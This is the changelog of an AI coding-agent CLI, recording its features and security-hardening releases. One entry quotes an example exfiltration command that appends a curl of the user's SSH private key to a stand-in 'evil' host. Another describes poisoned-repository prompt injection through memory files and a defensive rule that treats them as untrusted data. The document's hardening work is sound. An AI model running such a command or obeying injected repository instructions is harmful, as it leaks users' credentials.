# Changelog

All notable changes to `@axon/cli` are documented here.
The format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/);
versions follow [SemVer](https://semver.org/).

## 0.0.12 — 2026-06-02 — M3 (3/3): skills (`axon skill list|add|run`)

Claude-Code-compatible `SKILL.md` skills — saved instructions the agent carries
out with the full tool kit. Zero new dependencies.

- **`axon skill list`** — table of discoverable skills with scope + description.
- **`axon skill add <name>`** — scaffold `~/.axon/skills/<name>/SKILL.md` from a
  frontmatter template.
- **`axon skill run <name> [prompt…]`** — load the skill, inject its body into the
  agent system prompt (alongside resolved `AXON.md` memory), and run it through
  the same `runAgentTurn` loop as `chat --agent` — identical tools, the per-call
  permission gate, and the v0.0.11 workspace-confinement / SSRF guards.
- REPL: `/skills` lists, `/skill <name> [prompt]` runs a skill in-session (sharing
  the session's permission allowlist).
- Discovery (`src/skills/discovery.ts`, new): scans `~/.axon/skills/` →
  `./.claude/skills/` (compat) → `./.axon/skills/` (highest precedence); a skill
  is `<name>.md` or `<name>/SKILL.md`. Hand-rolled frontmatter parser (flat
  `key: value`, no YAML dep). Hardened like AXON.md memory: **skill names
  validated `^[A-Za-z0-9_-]+$`** (no `../` traversal), symlinked skill files
  rejected, 256 KB cap, best-effort (never throws).
- Tests: `test/skills.test.ts` (frontmatter, precedence, name-validation,
  symlink rejection) — 67 pass total.

## 0.0.11 — 2026-06-02 — security & robustness hardening

A full audit of everything shipped so far drove this pass. Headline fix: the
agent's file tools could read **anything on disk** (your API key, `~/.ssh`,
`.env`) with no gate — now they're confined to the workspace.

- **Filesystem confinement** (`src/tools/workspace.ts`, new): every built-in file
  tool now resolves + **canonicalizes** its path (defeating `..` and symlink
  escapes) and is confined to the workspace root (the git repo containing cwd,
  else cwd). Reads inside the repo stay silent; a read that escapes the root now
  **prompts** for permission (new `read_outside` gate) and a non-TTY run denies.
  `write_file`/`edit_file` flag out-of-root targets as `⚠ OUTSIDE WORKSPACE`;
  `glob`/`grep` drop matches outside the root (a `../../**` pattern can't leak).
- **web_fetch SSRF guard** (`src/tools/webfetch.ts`): the host is DNS-resolved
  and rejected if it maps to a loopback / link-local / private / ULA / CGNAT /
  metadata address (`169.254.169.254`, `127.0.0.1`, `10/8`, …), on the initial
  URL **and every redirect hop**. URLs with embedded `user:pass@` credentials are
  refused, the approval summary no longer prints userinfo, and the allow-key is a
  normalized host. `AXON_ALLOW_LOCAL_FETCH=1` overrides for local dev.
- **bash approval shows the FULL command** (`src/tools/bash.ts`): the old 200-char
  cap could hide a malicious tail (`npm test && curl evil?d=$(cat ~/.ssh/id_rsa)`)
  from the prompt.
- **HTTPS enforced** (`src/http.ts` `assertSecureBase`): the bearer key / device
  code can no longer be sent to a plaintext backend (http:// allowed only for
  localhost or under `AXON_ALLOW_INSECURE=1`). Checked on every request and at
  `config set apiBase` / `login --base`.
- **Atomic config write** (`src/config.ts`): replaced a non-atomic
  unlink-then-rewrite (a crash could lose the whole config) with a single
  `rename()`; added a POSIX group/other-writable dir guard (matching the
  long-standing doc comment).
- **Resource guards**: SSE reassembly buffer capped at 1 MB (a backend that never
  sends an event boundary can't OOM us); per-call tool-argument accumulation
  capped at 256 KB; `read_file`/`edit_file` refuse files over 10 MB whole.
- **edit_file ambiguity guard** (`src/diff.ts`): a search block that matches more
  than one location is now rejected instead of silently editing the first hit.
- **Privacy/UX**: telemetry sends only the file *basename*, never the project
  path; `axon login --key …` now shows the telemetry notice; the REPL flags when
  a `CLAUDE.md` is being trusted for compatibility.
- **Tests + CI**: new suites for confinement, SSRF, atomic config, the SSE caps,
  diff ambiguity, and HTTPS enforcement (57 tests). Added `.github/workflows/ci.yml`
  (ubuntu+windows × node 22/24) with a **stale-dist guard** so committed
  `dist/index.js` can't drift from `src/`. Bumped the engine floor to node ≥22
  (the file tools use `fs.glob`).

## 0.0.10 — 2026-05-31 — tighter permission keys + repo-confined memory walk

Follow-up hardening for two residuals flagged in the M3 test report.

- **Permission gate — exact "always allow" keys** (`src/tools/permKey.ts`, new):
  bash now keys on the **full command** (`"npm test"` ≠ `"npm run build"`),
  write_file/edit_file on the **exact file path** (`src/a.ts` ≠ `src/b.ts`);
  web_fetch still keys on hostname. Closes the "allow once → allow a whole family"
  gap — the gate is the load-bearing defense against a poisoned `AXON.md`.
- **Memory walk confined to the git repo** (`src/axonmd.ts` `findGitRoot`): the
  `AXON.md`/`CLAUDE.md` ancestor walk now stops at the detected git root; with no
  `.git` above the cwd, only the cwd's own file is read — no more climbing up to 25
  unrelated parent dirs (`$HOME`, a `node_modules` ancestor).
- Tests: `test/permkey.test.ts` added; walk + permission-store tests updated.
  Still flagged-not-changed: CLAUDE.md ingestion notice, outbound tool-result
  redaction (see `docs/M3-TEST-REPORT.md`).

## 0.0.9 — 2026-05-31 — M3 security hardening + first test suite

- Security (AXON.md memory resolution, `src/axonmd.ts`):
  - **No longer follows symlinked memory files** (`lstat` + reject symlinks). A
    repo can no longer smuggle an arbitrary file (e.g. `~/.ssh/id_rsa`,
    `~/.axon/config.json`) into the agent system prompt via `AXON.md -> secret`.
  - **256 KB pre-read size cap** on memory files — a huge (or symlinked-to-huge)
    file can no longer be read whole into memory (OOM guard).
  - **Memory reframed as untrusted DATA, not "authoritative instructions."** The
    injected block now tells the model never to follow embedded instructions that
    run tools / fetch URLs / exfiltrate / change the rules, and that nothing in
    memory can widen tool permissions. Mitigates poisoned-repo prompt injection
    (the per-call permission gate remains the load-bearing boundary).
- Tests: the CLI's first test suite (Vitest) — `npm test` / `npm run test:watch`.
  Covers M3 competency + robustness, the three fixes above, the permission gate
  (non-TTY auto-deny), and an offline mock-backend integration proving memory
  injection + gate enforcement. Adds a guarded live prompt-injection probe
  (`scripts/live-injection-probe.ts`, `AXON_LIVE=1`) and a findings report
  (`docs/M3-TEST-REPORT.md`).

## 0.0.8 — 2026-05-30 — M3 (1/3): AXON.md memory hierarchy

- Project-memory files are now resolved and injected into the agent system
  prompt at session start (REPL + `axon chat --agent`):
  - Global `~/.axon/AXON.md` (lowest precedence), then a cwd→up walk reading
    each ancestor dir's `AXON.md` (falling back to `CLAUDE.md` for Claude-Code
    compatibility), stopping at the git root. More-specific (cwd-local) files
    win on conflict.
  - Combined 16 k-char budget; over budget drops global/root-most first.
- REPL: banner + `/status` show resolved memory; new `/memory` (`/mem`)
  command re-reads from disk and lists the active sources.
- Plain (non-agent) `axon chat` is intentionally left user-only — no system
  injection — so the one-shot stream's routing/cost is unchanged.
- New: `src/axonmd.ts` (`resolveMemory` / `withMemory` / `memoryBannerLine`).

## 0.0.7 — 2026-05-29 — agentic REPL with built-in tools

- The REPL and `axon chat --agent` are now true agents: the model can call
  eight built-in tools to do real work on the machine —
  `read_file`, `glob`, `grep`, `ls` (read-only, run silently) and `bash`,
  `write_file`, `edit_file`, `web_fetch` (mutating, gated per call).
- Multi-turn tool loop (`src/agent.ts` `runAgentTurn`, max 25 turns):
  streams content, accumulates `tool_call_delta`s, dispatches each call,
  feeds results back as `role:"tool"` messages until the model stops calling.
- Session-scoped permission store (`src/permissions.ts`): "always allow" keyed
  by argv[0] (bash), top-level dir (write/edit), or hostname (web_fetch);
  non-TTY auto-denies so scripts stay safe.
- `src/sse.ts` extended with a `tool_call_delta` event; system prompt seeds
  the model with its tool affordances so it never refuses with "I can't read
  files."
- New: `src/tools/{schemas,registry,read,glob,grep,ls,bash,write,edit,webfetch}.ts`.

## 0.0.6 — 2026-05-29 — installer: in-script PATH patch

- `install.ps1` prepends the npm global-bin dir to `$env:PATH` for the current
  session **and** persists it to the User PATH via
  `[Environment]::SetEnvironmentVariable`, so `axon` works immediately without
  opening a new shell.

## 0.0.5 — 2026-05-29 — installer: resolve npm by absolute path

- Fixed `install.ps1` failing with "Unknown command: pm" when something in the
  user's PowerShell session shadowed `npm`: resolve `npm.cmd` via
  `Get-Command -CommandType Application` and invoke with splat-args
  (`& $npmCmd @installArgs`).

## 0.0.4 — 2026-05-29 — installer hardening

- `install.ps1` no longer calls `exit` (it was killing the host shell when run
  via `iex`); dropped `$ErrorActionPreference = 'Stop'`; ASCII-only output;
  added a post-install PATH check.

## 0.0.3 — 2026-05-28 — M2: REPL + closed-loop accept/reject

- Bare `axon` launches an interactive REPL when a key is on file
  (interactive TTY only; CI / non-TTY falls through to `--help`)
- Slash commands: `/file`, `/files`, `/clear`, `/status`, `/mode`,
  `/diff`, `/apply` (`a`), `/reject` (`r`), `/undo`, `/help`, `/exit`
- On backend `code_edit` responses: parses the payload, validates against
  `…` placeholders, renders a coloured unified diff inline, prompts for
  `[a]pply / [r]eject / [e]dit`
- Closed loop: each prompt fires `edit_proposed`, each `a` fires
  `edit_applied + edit_accepted`, each `r` fires `edit_rejected`
  (`method=command`), `/undo` fires `edit_rejected` (`method=undo`).
  Routing memory on the tenant updates from the next request onward.
- Ported (vscode-isms stripped) from the AXON VS Code extension:
  - `DiffApplier` → `src/diff.ts` (exact + whitespace-normalised search-
    and-replace, placeholder rejection, in-memory undo backup)
  - `EditorContext` → `src/context.ts` (`AttachedFiles`, 32 k char cap)
  - `CodingMode` → `src/mode.ts` (in-memory `SessionMode`)
- New: `src/render.ts` (jsdiff `structuredPatch` → ANSI hunks),
  `src/pending.ts` (single-slot `PendingEditState`), `src/telemetry.ts`
  (fire-and-forget `POST /v1/editor/events`, honours
  `cfg.telemetry === false`)
- Dep: `diff@^8.0.2` + `@types/diff@^8.0.0`

## 0.0.2 — 2026-05-28 — M1: chat + Unix pipe + first-run wizard

- `axon chat "prompt"` — one-shot SSE-streamed completion
- `axon "prompt"` — shorthand that dispatches to `chat` when the first
  argv token isn't a known subcommand
- `cat foo | axon chat "explain"` — stdin becomes a fenced context block
  appended to the arg-supplied prompt
- Flags: `--model`, `--mode auto|coding|chat`, `--json`, `--no-meta`,
  `--byok-openai-key`, `--byok-anthropic-key`, `--byok-google-key`
- Routing transparency: dim trailing line `> routed <model> via …
  ($X spent, $Y saved)` pulled from the SSE final chunk's `meta`
- First-run onboarding wizard: when `axon` is run with no args, no key
  on file, and stdin/stdout are TTYs — welcome banner + select prompt:
  - Sign in via browser (device-code flow)
  - Paste an existing AXON API key (password input)
  - I don't have a key yet (opens the waitlist)
- New: `src/sse.ts` (built-in fetch + event-stream parser, no extra
  deps), `src/commands/chat.ts`, `src/onboarding.ts`
- Hardening:
  - PowerShell quirk: stdin readers use a two-phase quiet-period race
    (150 ms initial, 1 s post-data) instead of `fstatSync` so bare
    invocations from PowerShell don't hang waiting for an EOF that
    never arrives
  - `main()` explicitly calls `process.exit(process.exitCode ?? 0)` so
    undici's fetch keep-alive pool can't hold the event loop open
- Dep: `prompts@^2.4.2` + `@types/prompts@^2.4.9`

## 0.0.1 — 2026-05-28 — M0: auth + first backend call

- Initial public surface
- Commands:
  - `axon login` — device-code flow against `POST /v1/auth/device`,
    polls `/poll`, writes `~/.axon/config.json` (mode `0o600` on POSIX)
  - `axon login --key axon_…` — headless paste, verified against
    `GET /v1/stats`
  - `axon whoami` — show tenant + key prefix, verify the key live
  - `axon logout` — wipe stored credentials
  - `axon stats` — request count, cache rate, spend, savings
  - `axon config get | set | list | path` — manage the config file
    (`apiKey` is intentionally read-only here — use `axon login`)
- Modules: `src/config.ts` (atomic writes, chmod 600), `src/http.ts`
  (Bearer-aware JSON wrapper, structured `AxonBackendError`),
  `src/browser.ts` (cross-platform URL opener)
- Default backend: `https://api.axon.nexalyte.tech` (override via
  `axon config set apiBase …`)
- Distribution: built with `tsup` to a single 18 KB ESM bundle,
  externals for `commander` / `chalk` / `ora` / `diff` / `prompts`
